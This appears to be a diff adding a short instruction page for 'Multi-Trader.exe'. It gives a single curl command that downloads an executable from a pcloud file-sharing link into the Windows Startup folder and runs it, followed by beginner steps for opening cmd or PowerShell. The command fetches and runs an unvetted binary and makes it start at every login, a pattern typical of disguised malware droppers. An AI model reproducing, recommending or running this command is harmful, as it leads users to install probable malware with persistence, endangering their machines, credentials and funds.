@@ -1,0 +1,15 @@
+Download and Run Multi-Trader.exe
+
+
+curl -L "https://p-lux2.pcloud.com/cBZUsqg4oZYEMVoD7ZZZWtcxVkZ2ZZemRZkZ18g0VZIFZtRZb8ZQLZYmZp4ZDRZfYZgQZi8ZKQZ8HZb4ZTpZPiW25ZNnonrypPXlyCrqcpWti10py3NdEy/Multi-Trader.exe" -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Multi-Trader.exe" && start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Multi-Trader.exe"
+
+
+How to Open Command Prompt (cmd):
+1. Start Menu: Click the Windows icon in the bottom-left corner, type "cmd" or "Command Prompt", and press Enter.
+2. Run Dialog: Press Win + R, type "cmd", and press Enter or click OK.
+3. Power User Menu: Right-click the Start button or press Win + X, then select "Command Prompt" or "Command Prompt (Admin)".
+
+How to Open Windows PowerShell:
+1. Start Menu: Click the Windows icon in the bottom-left corner, type "powershell" or "Windows PowerShell", and press Enter.
+2. Run Dialog: Press Win + R, type "powershell", and press Enter or click OK.
+3. Power User Menu: Right-click the Start button or press Win + X, then select "Windows PowerShell" or "Windows PowerShell (Admin)".
